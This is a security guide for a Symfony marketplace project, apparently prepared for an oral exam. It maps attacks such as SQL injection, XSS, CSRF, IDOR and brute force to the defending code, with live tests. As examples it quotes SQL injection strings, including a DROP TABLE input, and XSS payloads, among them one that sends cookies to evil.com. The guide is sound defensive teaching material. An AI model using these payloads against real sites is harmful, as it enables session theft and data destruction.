# SECURITY_GUIDE.md: where every defense is in the code

This guide is for the oral exam. For each attack it gives:
**what the attack is → where the defense is (file + lines) → the real code → why it works → how to show it live → the test that proves it.**

Every file path and line number was checked against the code (branch `main`). Links open the file at the right line on GitHub.

- Demo accounts (fixtures, dev only): `admin@shop.test`, `seller1@shop.test` … `seller4@shop.test`, `buyer1@shop.test` … `buyer8@shop.test`. Password for all: `Password2026!` (see [src/DataFixtures/AppFixtures.php](src/DataFixtures/AppFixtures.php#L55)).
- Local URL: `https://127.0.0.1:8000` (`symfony serve -d`, see README).
- Run the security tests: `php bin/phpunit tests/Security tests/Unit`.

---

## Summary

| # | Attack | Main file | Line | Status |
|---|--------|-----------|------|--------|
| 1 | [SQL injection](#1-sql-injection) | [src/Repository/ProductRepository.php](src/Repository/ProductRepository.php#L86-L90) | 86-90 | OK |
| 2 | [XSS (stored + reflected) and CSP](#2-xss-stored--reflected-and-csp) | [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L35-L53) | 35-53 | OK |
| 3 | [CSRF (forms, delete actions, logout)](#3-csrf-forms-delete-actions-logout) | [config/packages/security.yaml](config/packages/security.yaml#L47-L85) | 47-85 | OK |
| 4 | [IDOR (orders, products, reviews, addresses, wishlist)](#4-idor-orders-products-reviews-addresses-wishlist) | [src/Security/Voter/OrderVoter.php](src/Security/Voter/OrderVoter.php#L82-L99) | 82-99 | OK |
| 5 | [Privilege escalation](#5-privilege-escalation) | [src/Controller/RegistrationController.php](src/Controller/RegistrationController.php#L69-L71) | 69-71 | OK |
| 6 | [Mass assignment (DTOs)](#6-mass-assignment-dtos) | [src/Controller/ProfileController.php](src/Controller/ProfileController.php#L57-L66) | 57-66 | OK |
| 7 | [Brute force](#7-brute-force-login-throttling-rate-limiters-lockout-userchecker) | [src/EventSubscriber/LoginLockoutSubscriber.php](src/EventSubscriber/LoginLockoutSubscriber.php#L89-L99) | 89-99 | OK |
| 8 | [Password storage (Argon2id)](#8-password-storage-argon2id) | [config/packages/security.yaml](config/packages/security.yaml#L8-L16) | 8-16 | OK |
| 9 | [2FA TOTP](#9-2fa-totp) | [src/Controller/SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L103-L105) | 103-105 | OK |
| 10 | [User enumeration](#10-user-enumeration-login--password-reset) | [src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L90-L99) | 90-99 | PARTIAL |
| 11 | [Price tampering + stock race condition](#11-price-tampering--stock-race-condition) | [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L184-L202) | 184-202 | OK |
| 12 | [Malicious file upload](#12-malicious-file-upload) | [src/Service/ImageStorage.php](src/Service/ImageStorage.php#L88-L147) | 88-147 | OK |
| 13 | [SSRF (import image from URL)](#13-ssrf-import-image-from-url) | [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L111-L166) | 111-166 | OK |
| 14 | [Open redirect](#14-open-redirect-_target_path) | [src/Security/SafeRedirect.php](src/Security/SafeRedirect.php#L28-L55) | 28-55 | OK |
| 15 | [Clickjacking](#15-clickjacking) | [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L3-L6) | 3-6 | OK |
| 16 | [Sensitive data](#16-sensitive-data-iban-encryption-card-data-secrets) | [src/Service/FieldEncryptor.php](src/Service/FieldEncryptor.php#L52-L64) | 52-64 | OK |
| 17 | [CSV injection](#17-csv-injection-audit-log-export) | [src/Service/CsvSanitizer.php](src/Service/CsvSanitizer.php#L34-L44) | 34-44 | OK |
| 18 | [Vulnerable dependencies](#18-vulnerable-dependencies-ci-workflow) | [.github/workflows/security.yml](.github/workflows/security.yml#L42-L46) | 42-46 | OK |
| 19 | [Audit log and security center](#19-audit-log-and-security-center-detection) | [src/Service/AuditLogger.php](src/Service/AuditLogger.php#L54-L90) | 54-90 | OK |
| 20 | [Headers, HTTPS, cookies, error pages](#20-security-headers-https-session-cookies-error-pages) | [config/packages/framework.yaml](config/packages/framework.yaml#L8-L29) | 8-29 | OK |
| 21 | [Extra defenses found in the code](#21-extra-defenses-found-in-the-code) | [src/Service/CashOnDeliveryPolicy.php](src/Service/CashOnDeliveryPolicy.php#L58-L73) | 58-73 | OK |
| - | [Gaps to fix](#gaps-to-fix) | | | |
| - | [Demo order for the oral](#demo-order-for-the-oral) | | | |

---

## 1. SQL injection

**The attack.** The attacker types SQL in a field so it becomes part of the query.
Example here: searching the catalogue for `' OR 1=1 -- ` or sending `?sort=price;DROP TABLE user` to list every hidden product or break the database.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Repository/ProductRepository.php](src/Repository/ProductRepository.php#L86-L121) | `ProductRepository::search` | 86-90 (search text), 116-118 (ORDER BY) |
| [src/Dto/ProductSearchCriteria.php](src/Dto/ProductSearchCriteria.php#L30-L37) | `ProductSearchCriteria::SORTS` / `fromRequest` | 30-37, 86-88 |
| [src/Service/ListQuery.php](src/Service/ListQuery.php#L58-L63) | `ListQuery::fromRequest` (dashboard tables) | 58-63 |
| [src/Repository/AddressRepository.php](src/Repository/AddressRepository.php#L70) | `AddressRepository` (scoped lookup) | 70 |
| [src/Service/AuditLogger.php](src/Service/AuditLogger.php#L73-L85) | `AuditLogger::log` (DBAL insert with types) | 73-85 |

**The defending code**

`src/Repository/ProductRepository.php` lines 86-90 and 116-118:
```php
if ('' !== $c->query) {
    // SECURITY (rule 1): the text is a bound parameter. LIKE wildcards (% and _) typed by the user are
    // escaped too, so "%" can't be used to dump everything or build slow patterns.
    $qb->andWhere('(p.name LIKE :q OR p.description LIKE :q)')
        ->setParameter('q', '%'.addcslashes($c->query, '%_\\').'%');
...
// SECURITY (rule 1): ORDER BY comes from a fixed whitelist (ProductSearchCriteria::SORTS), never from input.
[$field, $direction] = $c->orderBy();
$qb->orderBy($field, $direction)->addOrderBy('p.id', 'DESC')->addOrderBy('img.position', 'ASC')
```

`src/Dto/ProductSearchCriteria.php` lines 86-88:
```php
// SECURITY: SQL injection - the sort key must be one of the keys of SORTS; otherwise "newest" is used.
$sort = $q->getString('sort', 'newest');
$sort = array_key_exists($sort, self::SORTS) ? $sort : 'newest';
```

`src/Service/ListQuery.php` lines 58-63:
```php
// SECURITY: SQL injection - "sort" is only accepted if it is a key of the whitelist.
$sort = $request->query->getString('sort', $defaultSort);
$sort = array_key_exists($sort, $sorts) ? $sort : $defaultSort;
// SECURITY: SQL injection - "dir" can only be ASC or DESC.
$dir = strtoupper($request->query->getString('dir', $defaultDir));
$dir = in_array($dir, ['ASC', 'DESC'], true) ? $dir : $defaultDir;
```

**How it works.** Every value goes through `setParameter()`: the database receives the SQL text and the value separately, so the value can never become SQL code. `ORDER BY` can't use parameters, so the user only chooses a *key* of a fixed list, never the column name itself. A search of the whole `src/` folder finds no `createNativeQuery`, `executeQuery` or string concatenation of input.

**How to test it live**
1. As a visitor, open `https://127.0.0.1:8000/products?q=' OR 1=1 -- `.
   Expected: normal page, "0 pieces for “' OR 1=1 -- ”". No SQL error, no hidden products.
2. Open `https://127.0.0.1:8000/products?sort=price;DROP%20TABLE%20user`.
   Expected: the list is sorted by "Newest" (default). Nothing breaks.
3. Log in as `seller1@shop.test`, open `/seller/products?sort=p.id);--&dir=x`. Expected: default sort, page works.
4. Optional: run `sqlmap -u "https://127.0.0.1:8000/products?q=test"`. Expected: "parameter does not seem to be injectable".

**Related test:** NONE (no automated SQL injection test, see [Gaps](#gaps-to-fix)).

---

## 2. XSS (stored + reflected) and CSP

**The attack.** The attacker stores or reflects JavaScript so it runs in another user's browser (steal the session, act as the victim).
Example here: a buyer writes a review `<script>fetch('https://evil.com/?c='+document.cookie)</script>`. Reflected example: `/products?q=<script>alert(1)</script>`.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/twig.yaml](config/packages/twig.yaml#L4) | Twig auto-escaping (on by default) | 4 |
| [templates/catalog/show.html.twig](templates/catalog/show.html.twig#L137-L138) | product description, plain text | 137-138 |
| [templates/catalog/show.html.twig](templates/catalog/show.html.twig#L209-L210) | review comment, plain text | 209-210 |
| [templates/catalog/index.html.twig](templates/catalog/index.html.twig#L100) | reflected search text, auto-escaped | 100 |
| [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L35-L53) | Content-Security-Policy | 35-53 |
| [templates/base.html.twig](templates/base.html.twig#L25-L28) | CSP nonce on the importmap scripts | 25-28 |
| [config/packages/framework.yaml](config/packages/framework.yaml#L15) | session cookie `httponly` (XSS can't read it) | 15 |
| [src/Controller/MediaController.php](src/Controller/MediaController.php#L47-L52) | images: fixed type + `nosniff` + sandbox CSP | 47-52 |

**The defending code**

`templates/catalog/show.html.twig` lines 209-210:
```twig
{# SECURITY (rule 2): stored XSS impossible. The comment is plain text, auto-escaped, never |raw. #}
<p class="pre-line mb-0 mt-3">{{ review.comment }}</p>
```

`config/packages/nelmio_security.yaml` lines 35-53 (short excerpt):
```yaml
csp:
    enabled: true
    ...
    enforce:
        default-src: ["'self'"]
        script-src: ["'self'"]
        style-src: ["'self'"]
        img-src: ["'self'", 'data:']
        object-src: ["'none'"]
        base-uri: ["'self'"]
        form-action: ["'self'"]
        frame-ancestors: ["'none'"]
        upgrade-insecure-requests: true
```

`templates/base.html.twig` lines 25-28:
```twig
{# SECURITY (rule 13): the importmap's inline <script> tags carry a random per-response CSP nonce; any other
   inline script (e.g. injected by XSS) has no nonce and is blocked by the browser. All CSS, fonts and icons
   are served by this app (AssetMapper): no CDN, so the CSP stays at 'self'. #}
{% block importmap %}{{ importmap('app', {nonce: csp_nonce('script')}) }}{% endblock %}
```

**How it works.** Twig turns `<` into `&lt;` for every `{{ }}`, so stored or reflected HTML is shown as text. A search in `templates/` finds no `|raw` filter. If one injection still slipped through, the CSP is a second wall: the browser only runs scripts from this site or with the per-response nonce, so an injected `<script>` or `onclick=` is blocked. The session cookie is `HttpOnly`, so even a working XSS could not read it.

**How to test it live**
1. Log in as `buyer1@shop.test`. Open a product from one of buyer1's delivered orders (`/buyer/orders` → order → product), write a review:
   `<script>alert(document.cookie)</script><img src=x onerror=alert(1)>`.
   Expected: the review is shown as plain text, no popup.
2. Reflected: open `https://127.0.0.1:8000/products?q=<script>alert(1)</script>`. Expected: the text is displayed, no popup.
3. Open DevTools → Network → any page → response headers. Expected: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-…'; … frame-ancestors 'none'`.
4. DevTools → Console: run `document.cookie`. Expected: the session cookie is NOT listed (HttpOnly).

**Related test:** NONE (no automated XSS test, see [Gaps](#gaps-to-fix)).
Note: CLAUDE.md mentions HTMLPurifier for rich text. The app has **no rich text** (all text is plain text), so HTMLPurifier is not installed and not needed.

---

## 3. CSRF (forms, delete actions, logout)

**The attack.** A malicious website makes the victim's browser send a request to our site with the victim's cookies.
Example here: `evil.com` contains a hidden form that POSTs to `/seller/products/{uuid}/delete`, or logs the victim out, while the seller is logged in.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/csrf.yaml](config/packages/csrf.yaml#L1-L10) | CSRF on all Symfony forms | 1-10 |
| [config/packages/security.yaml](config/packages/security.yaml#L47-L50) | login form CSRF | 47-50 |
| [config/packages/security.yaml](config/packages/security.yaml#L70-L73) | 2FA code form CSRF | 70-73 |
| [config/packages/security.yaml](config/packages/security.yaml#L77-L85) | logout: POST + CSRF + session destroyed | 77-85 |
| [src/Controller/SecurityController.php](src/Controller/SecurityController.php#L49) | `SecurityController::logout`, `methods: ['POST']` | 49 |
| [templates/layouts/_store_header.html.twig](templates/layouts/_store_header.html.twig#L73-L78) | logout form with token | 73-78 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L173-L179) | `ProductController::delete` | 173-179 |
| [src/Controller/OrderController.php](src/Controller/OrderController.php#L95-L101) | `OrderController::cancel` | 95-101 |
| [src/Controller/Buyer/AddressController.php](src/Controller/Buyer/AddressController.php#L181-L187) | `AddressController::assertCsrf` | 181-187 |
| [src/Controller/Admin/UserController.php](src/Controller/Admin/UserController.php#L261-L270) | `UserController::guard` | 261-270 |
| [config/packages/framework.yaml](config/packages/framework.yaml#L5-L6) | `http_method_override: false` | 5-6 |
| [config/packages/framework.yaml](config/packages/framework.yaml#L16) | `cookie_samesite: lax` (extra layer) | 16 |

**The defending code**

`src/Controller/Seller/ProductController.php` lines 173-181:
```php
#[Route('/{uuid}/delete', name: 'seller_product_delete', methods: ['POST'], requirements: ['uuid' => Requirement::UUID_V4])]
public function delete(Request $request, #[MapEntity(mapping: ['uuid' => 'uuid'])] Product $product): Response
{
    // SECURITY (rule 3): POST + per-object CSRF token; a GET or a forged form can't delete anything.
    if (!$this->isCsrfTokenValid('delete-product-'.$product->getUuid(), $request->request->getString('_token'))) {
        throw $this->createAccessDeniedException('Invalid CSRF token.');
    }
    // SECURITY: IDOR - the voter checks the product belongs to the logged-in seller.
    $this->denyAccessUnlessGranted(ProductVoter::EDIT, $product);
```

`config/packages/security.yaml` lines 77-85:
```yaml
logout:
    path: app_logout
    target: app_home
    # SECURITY (rule 3): logout needs a CSRF token, so another site can't log the user out.
    enable_csrf: true
    csrf_parameter: _csrf_token
    csrf_token_id: logout
    # SECURITY: session hijacking - the session is destroyed at logout, so the old cookie is useless.
    invalidate_session: true
```

`templates/layouts/_store_header.html.twig` lines 73-78:
```twig
{# SECURITY (rule 3): logout is a POST with a CSRF token, never a GET link. #}
<form method="post" action="{{ path('app_logout') }}">
    {# Hidden CSRF token of the logout form. #}
    <input type="hidden" name="_csrf_token" value="{{ csrf_token('logout') }}">
```

**How it works.** Each form gets a random token stored in the user's session. The attacker's site can't read it (same-origin policy), so a forged request has no valid token and gets 403. Delete/cancel/admin actions use one token per action **and** per object (`delete-product-<uuid>`). Routes that change state accept POST only (GET → 405), and `SameSite=Lax` blocks the cookie on cross-site POSTs as an extra layer.

**How to test it live**
1. Log in as `seller1@shop.test`, open `/seller/products`. In Burp, intercept the "Delete" form POST and change `_token` to `abc`. Expected: **403 "Invalid CSRF token"**, the product still exists.
2. Remove `_token` completely. Expected: 403.
3. In the browser bar open `https://127.0.0.1:8000/seller/products/<uuid>/delete` (GET). Expected: **405 Method Not Allowed**.
4. Logout: in Burp, send `POST /logout` with `_csrf_token=forged`. Expected: you are still logged in (open `/seller`, it works).

**Related test:** [tests/Security/CsrfTest.php](tests/Security/CsrfTest.php#L33-L59): `testPostWithoutValidCsrfTokenIsRejected` (10 actions: cart, wishlist, cancel order, delete address, delete/toggle product, cash collected/refused, admin lock, admin refund), `testStateChangingRoutesRefuseGet`, `testLogoutRequiresAToken`.

---

## 4. IDOR (orders, products, reviews, addresses, wishlist)

**The attack.** The attacker changes an id in the URL to open or change an object of another user.
Example here: buyer2 opens `/orders/<uuid of buyer1's order>`, or seller2 opens `/seller/products/<uuid of seller1's product>/edit`.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Security/Voter/OrderVoter.php](src/Security/Voter/OrderVoter.php#L82-L99) | `OrderVoter::voteOnAttribute` | 82-99 |
| [src/Controller/OrderController.php](src/Controller/OrderController.php#L68-L73) | `OrderController::show` | 68-73 |
| [src/Repository/OrderRepository.php](src/Repository/OrderRepository.php#L37) | buyer list scoped to the buyer | 37 |
| [src/Security/Voter/ProductVoter.php](src/Security/Voter/ProductVoter.php#L60-L72) | `ProductVoter::voteOnAttribute` | 60-72 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L141-L145) | `ProductController::edit` | 141-145 |
| [src/Security/Voter/ReviewVoter.php](src/Security/Voter/ReviewVoter.php#L76-L95) | `ReviewVoter::voteOnAttribute` | 76-95 |
| [src/Controller/Buyer/ReviewController.php](src/Controller/Buyer/ReviewController.php#L76-L77) | `ReviewController::edit` | 76-77 |
| [src/Security/Voter/AddressVoter.php](src/Security/Voter/AddressVoter.php#L52-L55) | `AddressVoter::voteOnAttribute` | 52-55 |
| [src/Controller/Buyer/AddressController.php](src/Controller/Buyer/AddressController.php#L105-L109) | `AddressController::edit` / `delete` | 105-109, 152-157 |
| [src/Controller/WishlistController.php](src/Controller/WishlistController.php#L31-L34) | wishlist lookup by (user, product) | 31-34, 62-63 |
| [src/Controller/Buyer/WishlistController.php](src/Controller/Buyer/WishlistController.php#L63-L64) | `WishlistController::moveToCart` | 63-64 |
| [src/Controller/CartController.php](src/Controller/CartController.php#L119-L121) | `CartController::update` (cart scoped to buyer) | 119-121 |
| [src/Entity/Order.php](src/Entity/Order.php#L69) | random UUID in URLs (also Product 47, User 55, Address 48, Review 35) | 69 |

**The defending code**

`src/Security/Voter/OrderVoter.php` lines 82-99:
```php
// SECURITY: IDOR - true only when the logged-in buyer is the buyer of this order.
/** @var Order $subject */
$isBuyer = $user->isBuyer() && $subject->getBuyer()->getId() === $user->getId();
...
return match ($attribute) {
    self::VIEW => $user->isAdmin() || $isBuyer || ($user->isSeller() && $subject->hasSeller($user)),
    self::CANCEL => $isBuyer && $subject->isCancellable(),
    self::ADMIN_CANCEL => $user->isAdmin() && $subject->isCancellable(),
    self::REFUND => $user->isAdmin() && $subject->isRefundable(),
    self::CASH_COLLECT => $isOnlySeller && $subject->isCashCollectable(),
    self::CASH_REFUSE => $isOnlySeller && $subject->isDeliveryRefusable(),
    default => false,
};
```

`src/Security/Voter/ProductVoter.php` lines 60-72:
```php
// SECURITY: ownership compared on the database id of the logged-in user, never on a request value, and the
// user must STILL be a seller (a demoted seller can't manage old listings).
$isOwner = $isUser && $user->isSeller() && $product->getSeller()->getId() === $user->getId();
$isAdmin = $isUser && $user->isAdmin();

return match ($attribute) {
    self::VIEW => $product->isActive() || $isOwner || $isAdmin,
    self::EDIT => $isOwner,
    self::DELETE, self::TOGGLE => $isOwner || $isAdmin,
    self::MODERATE => $isAdmin,
    default => false,
};
```

`src/Security/Voter/AddressVoter.php` lines 52-55:
```php
// SECURITY: IDOR - allowed only when the address belongs to the logged-in buyer. The owner is compared with
// the user of the session, so changing the UUID in the URL to someone else's address gives "access denied".
/** @var Address $subject */
return $user instanceof User && $user->isBuyer() && $subject->getUser()->getId() === $user->getId();
```

`src/Controller/Buyer/WishlistController.php` lines 63-64:
```php
// SECURITY: IDOR - the line is searched in the wishlist of the logged-in buyer only (404 otherwise).
$line = $wishlist->findOneForUserAndProduct($buyer, $product) ?? throw $this->createNotFoundException();
```

**How it works.** Every controller that loads one object calls `denyAccessUnlessGranted(...)`; the Voter compares the owner of the object with the user **from the session**, never with a value from the request. Lists (orders, wishlist, cart, addresses) are filtered by the logged-in user in the query itself. Public URLs use random UUID v4 instead of 1, 2, 3…, so ids can't be guessed one by one.

**How to test it live**
1. Log in as `buyer1@shop.test`, open `/buyer/orders`, open an order and copy its URL (`/orders/<uuid>`). Log out.
2. Log in as `buyer2@shop.test`, paste the URL. Expected: **403 Access denied**.
3. Log in as `admin@shop.test`, open `/admin/audit`: a new `access.denied` row for buyer2 with the path.
4. Same idea for products: copy `/seller/products/<uuid>/edit` as `seller1`, open it as `seller2`. Expected: 403.
5. Addresses: copy `/buyer/addresses/<uuid>/edit` as buyer1, open it as buyer2. Expected: 403.

**Related test:** [tests/Security/ObjectAccessTest.php](tests/Security/ObjectAccessTest.php): `testBuyerCannotOpenAnotherBuyersOrder` (line 19), `testBuyerCannotEditOrDeleteAnotherBuyersAddress` (33), `testSellerCannotEditAnotherSellersProduct` (42), `testSellerSeesOnlyOwnItemsAndNeverTheBuyerEmail` (56), `testBuyerCannotReviewAProductHeNeverBought` (82). No dedicated wishlist IDOR test.

---

## 5. Privilege escalation

**The attack.** A normal user tries to get more rights: open `/admin`, register as admin, or become a seller without approval.
Example here: a buyer adds `registration_form[roles][]=ROLE_ADMIN` in Burp, or an admin's stolen session sends `role=admin` to promote someone.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/security.yaml](config/packages/security.yaml#L90-L115) | role hierarchy (no inheritance) + `access_control` | 90-115 |
| [src/Controller/RegistrationController.php](src/Controller/RegistrationController.php#L69-L71) | `RegistrationController::register`: always ROLE_BUYER | 69-71 |
| [src/Form/RegistrationFormType.php](src/Form/RegistrationFormType.php#L24-L28) | no `roles` field | 24-28 |
| [src/Entity/User.php](src/Entity/User.php#L207-L218) | `User::setRoles`: exactly one known role | 207-218 |
| [src/Security/Voter/SellerApplicationVoter.php](src/Security/Voter/SellerApplicationVoter.php#L61-L72) | apply / review rules | 61-72 |
| [src/Controller/Admin/ApplicationController.php](src/Controller/Admin/ApplicationController.php#L74-L89) | `ApplicationController::approve` | 74-89 |
| [src/Service/AccountManager.php](src/Service/AccountManager.php#L87-L97) | `AccountManager::switchRole`: whitelist | 87-97 |
| [src/Controller/Admin/UserController.php](src/Controller/Admin/UserController.php#L174-L183) | `UserController::changeRole` | 174-183 |
| [src/Security/Voter/UserManagementVoter.php](src/Security/Voter/UserManagementVoter.php#L49-L63) | never on self, never on an admin | 49-63 |
| [src/Command/CreateAdminCommand.php](src/Command/CreateAdminCommand.php#L30-L34) | `app:create-admin`: only way to create an admin | 30-34, 79-117 |
| [src/Security/UserChecker.php](src/Security/UserChecker.php#L39-L43) | tampered DB row with 2 roles is refused | 39-43 |

**The defending code**

`src/Controller/RegistrationController.php` lines 69-73:
```php
// SECURITY (rules 4, 9): every self-registered account is a BUYER, set by the server. Sellers are promoted
// only after an administrator approves their application; ROLE_ADMIN only via app:create-admin.
$user->setRoles([User::ROLE_BUYER]);
// SECURITY: Argon2id hash ("auto" in security.yaml, rule 5); the plain password is never stored.
$user->setPassword($passwordHasher->hashPassword($user, $form->get('plainPassword')->getData()));
```

`config/packages/security.yaml` lines 106-112:
```yaml
# SECURITY (rule 4): every area is protected by role at the firewall level, as a first layer;
# controllers add #[IsGranted] and Voters check each object.
- { path: ^/admin, roles: ROLE_ADMIN }
- { path: ^/seller, roles: ROLE_SELLER }
- { path: ^/buyer, roles: ROLE_BUYER }
# Buying is reserved to buyers (role matrix, phase R5): sellers and admins can't use the cart or checkout.
- { path: ^/(cart|checkout|wishlist), roles: ROLE_BUYER }
```

`src/Security/Voter/SellerApplicationVoter.php` lines 61-71:
```php
if (self::APPLY === $attribute) {
    // SECURITY: roles are exclusive; only buyers apply, one pending application at a time (no spam).
    return $user->isBuyer() && !$this->applications->hasPending($user);
}

/** @var SellerApplication $subject */
// SECURITY: IDOR - VIEW: only the applicant or an admin. REVIEW: an admin, only once, and never on their own application.
return match ($attribute) {
    self::VIEW => $user->isAdmin() || $subject->getApplicant()->getId() === $user->getId(),
    self::REVIEW => $user->isAdmin() && $subject->isPending() && $subject->getApplicant()->getId() !== $user->getId(),
```

`src/Service/AccountManager.php` lines 89-97:
```php
// SECURITY (rule 9): fixed whitelist, ROLE_ADMIN is unreachable.
$role = match ($target) {
    'buyer' => User::ROLE_BUYER,
    'seller' => User::ROLE_SELLER,
    default => throw new \InvalidArgumentException('Invalid role.'),
};
if ($user->isAdmin()) {
    throw new \DomainException('Administrator accounts are managed from the console.');
}
```

`src/Command/CreateAdminCommand.php` lines 30-34:
```php
/**
 * SECURITY (rule 9): the ONLY way to create an administrator. Registration can never produce ROLE_ADMIN,
 * and there is no web page to grant it: an attacker needs shell access to the server.
 */
#[AsCommand(name: 'app:create-admin', description: 'Create an administrator account (password asked interactively, hidden).')]
```

**How it works.** Four layers: (1) `access_control` blocks a whole URL area by role; (2) `#[IsGranted]` on each controller; (3) the server always sets the role itself (registration = buyer, approval = seller, console = admin); (4) `UserManagementVoter` stops an admin from touching himself or another admin. Roles don't inherit each other, so an admin is not a buyer and a seller is not a buyer (least privilege).

**How to test it live**
1. Log in as `buyer1@shop.test`, open `https://127.0.0.1:8000/admin`. Expected: **403**. Open `/seller`. Expected: 403.
2. Register a new account; in Burp add `registration_form[roles][]=ROLE_ADMIN` to the POST body. Expected: the form is rejected ("This form should not contain extra fields"); no admin account.
3. As `buyer2@shop.test` go to `/buyer/become-a-seller` and apply: you stay a buyer until the admin approves at `/admin/applications`.
4. As `admin@shop.test`, open `/admin/users/<uuid of buyer4>`, intercept "Switch role" in Burp and change `role=seller` to `role=admin`. Expected: **403**, buyer4 is still a buyer.
5. Show the console: `php bin/console app:create-admin new@shop.test` asks for a hidden password.

**Related test:** [tests/Security/PrivilegeMatrixTest.php](tests/Security/PrivilegeMatrixTest.php): `testVisitorIsSentToLogin` (line 23), `testRoleCannotOpenOtherRolesArea` (45), `testRoleCanOpenItsOwnArea` (66). [tests/Security/ObjectAccessTest.php](tests/Security/ObjectAccessTest.php): `testAdminCannotManageHimselfNorAnotherAdmin` (92), `testAdminCannotGrantTheAdminRole` (114).

---

## 6. Mass assignment (DTOs)

**The attack.** The attacker adds extra fields to a form so the server copies them onto the entity.
Example here: on the profile page, add `profile_form[roles][]=ROLE_ADMIN` or `profile_form[email]=admin@shop.test`; on checkout add `checkout_form[total]=0.01`.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Dto/ProfileDto.php](src/Dto/ProfileDto.php#L15-L31) | `ProfileDto` (2 fields only) | 15-31 |
| [src/Controller/ProfileController.php](src/Controller/ProfileController.php#L57-L66) | `ProfileController::profile`: explicit copy | 57-66 |
| [src/Dto/IbanDto.php](src/Dto/IbanDto.php#L19) + [src/Controller/Seller/ShopController.php](src/Controller/Seller/ShopController.php#L122-L124) | IBAN form bound to a DTO | 19; 122-124 |
| [src/Dto/PaymentDto.php](src/Dto/PaymentDto.php#L18-L33) + [src/Form/CheckoutFormType.php](src/Form/CheckoutFormType.php#L22-L25) | checkout: payment fields only | 18-33; 22-25 |
| [src/Form/RegistrationFormType.php](src/Form/RegistrationFormType.php#L24-L28) | explicit field list (name, email, password, terms) | 24-28 |
| [src/Form/ProductFormType.php](src/Form/ProductFormType.php#L36) | no `seller`, `uuid`, images collection | 36 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L117-L118) | owner from the session | 117-118 |
| [src/Controller/Buyer/AddressController.php](src/Controller/Buyer/AddressController.php#L74-L75) | owner from the session | 74-75 |

**The defending code**

`src/Controller/ProfileController.php` lines 57-66:
```php
// SECURITY: mass assignment - the form fills a small DTO (2 fields), not the User entity. So a forged
// field such as "roles" or "email" has nowhere to go.
$dto = ProfileDto::fromUser($user);
$form = $this->createForm(ProfileFormType::class, $dto);
$form->handleRequest($request);

if ($form->isSubmitted() && $form->isValid()) {
    // SECURITY (rule 9): explicit copy of the allowed fields only.
    $user->setDisplayName($dto->displayName);
    $user->setPhone($dto->phone);
```

`src/Form/CheckoutFormType.php` lines 22-25:
```php
/**
 * SECURITY (rule 10, price tampering): the checkout form contains ONLY payment fields. There is no price,
 * total, quantity or product field: everything the order is made of is re-read from the database by
 * CheckoutService. Extra submitted fields (e.g. checkout_form[total]=0.01) make the form invalid.
```

`src/Controller/Seller/ProductController.php` lines 117-118:
```php
// SECURITY (rule 9): the owner comes from the session, never from the form.
$product = new Product($this->getSeller());
```

**How it works.** The profile, IBAN and payment forms fill a small DTO that only has the allowed fields, then the controller copies them one by one. The other forms list their fields explicitly; Symfony rejects any extra field ("This form should not contain extra fields"). Owners (seller, buyer, author, applicant) are always set from the session in the constructor.

**How to test it live**
1. Log in as `buyer1@shop.test`, open `/account/profile`, intercept the save in Burp, add `profile_form[roles][]=ROLE_ADMIN&profile_form[email]=hacker@x.com`. Expected: 422 with "extra fields", nothing changed.
2. Log in as `seller1@shop.test`, create a product and add `product_form[seller]=<another id>`. Expected: rejected; the product always belongs to seller1.

**Related test:** [tests/Security/CheckoutPriceTamperingTest.php](tests/Security/CheckoutPriceTamperingTest.php#L18-L36) `testExtraPriceFieldInThePaymentFormIsRejected`; [tests/Security/ObjectAccessTest.php](tests/Security/ObjectAccessTest.php#L114) `testAdminCannotGrantTheAdminRole`. No test for the profile form.

---

## 7. Brute force (login throttling, rate limiters, account lockout, UserChecker)

**The attack.** The attacker tries thousands of passwords (or 2FA codes, or reset tokens) until one works.
Example here: a script POSTs `/login` with `admin@shop.test` and a password list.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/security.yaml](config/packages/security.yaml#L57-L61) | `login_throttling`: 5 / 15 min per IP+email | 57-61 |
| [config/packages/rate_limiter.yaml](config/packages/rate_limiter.yaml#L1-L46) | 8 named rate limiters | 1-46 |
| [src/Entity/User.php](src/Entity/User.php#L45-L47) | lockout policy constants | 45-47 |
| [src/Entity/User.php](src/Entity/User.php#L274-L284) | `User::registerFailedLogin` | 274-284 |
| [src/EventSubscriber/LoginLockoutSubscriber.php](src/EventSubscriber/LoginLockoutSubscriber.php#L73-L99) | `LoginLockoutSubscriber::onLoginFailure` | 73-99 |
| [src/EventSubscriber/LoginLockoutSubscriber.php](src/EventSubscriber/LoginLockoutSubscriber.php#L115-L118) | `onLoginSuccess`: reset counter | 115-118 |
| [src/Security/UserChecker.php](src/Security/UserChecker.php#L32-L55) | `UserChecker::checkPreAuth` | 32-55 |
| [src/EventSubscriber/TwoFactorSubscriber.php](src/EventSubscriber/TwoFactorSubscriber.php#L53-L65) | `TwoFactorSubscriber::onAttempt` (2FA codes) | 53-65 |
| [src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L77-L84) | reset request limiter | 77-84, 146-151 |
| [config/packages/reset_password.yaml](config/packages/reset_password.yaml#L3-L7) | 1 email / 15 min / account, link valid 1 h | 3-7 |
| [src/Controller/RegistrationController.php](src/Controller/RegistrationController.php#L61-L67) | 5 accounts / hour / IP | 61-67 |
| [src/Controller/ProfileController.php](src/Controller/ProfileController.php#L104-L110) | change password limiter | 104-110 |

**The defending code**

`config/packages/security.yaml` lines 57-61:
```yaml
# SECURITY (rule 6): Symfony login throttling. 5 attempts per 15 minutes per IP + email,
# plus a global limit of 25 attempts per 15 minutes per IP (5 x max_attempts).
login_throttling:
    max_attempts: 5
